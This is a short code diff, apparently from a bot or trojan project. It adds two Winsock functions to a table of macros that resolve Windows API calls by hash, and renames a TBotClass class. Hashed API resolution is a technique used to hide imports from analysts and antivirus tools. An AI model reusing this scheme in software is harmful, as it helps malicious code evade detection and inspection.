@@ -562,6 +562,8 @@ inline LPVOID pushargEx(A1 a1, A2 a2, A3 a3, A4 a4, A5 a5, A6 a6, A7 a7, A8 a8,
 #define psetsockopt					pushargEx< DLL_WINSOCK, 0xD8923733>
 #define pWSAGetLastError			pushargEx< DLL_WINSOCK, 0x8E878072>
 #define pWSASetLastError			pushargEx< DLL_WINSOCK, 0x8E850072>
+#define pioctlsocket		     	pushargEx< DLL_WINSOCK, 0x1F935B1D>
+#define pWSAFDIsSet   		     	pushargEx< DLL_WINSOCK, 0x4DFC1F3B>
 
 //ntdll
 #define pRtlInitUnicodeString 		pushargEx< DLL_NTDLL, 0x3287EC73>
@@ -761,7 +763,7 @@ inline LPVOID pushargEx(A1 a1, A2 a2, A3 a3, A4 a4, A5 a5, A6 a6, A7 a7, A8 a8,
 //****************************************************************
 
 
-class TBotClass
+class TBotObject
 {
 public:
 	void* operator new(size_t size);
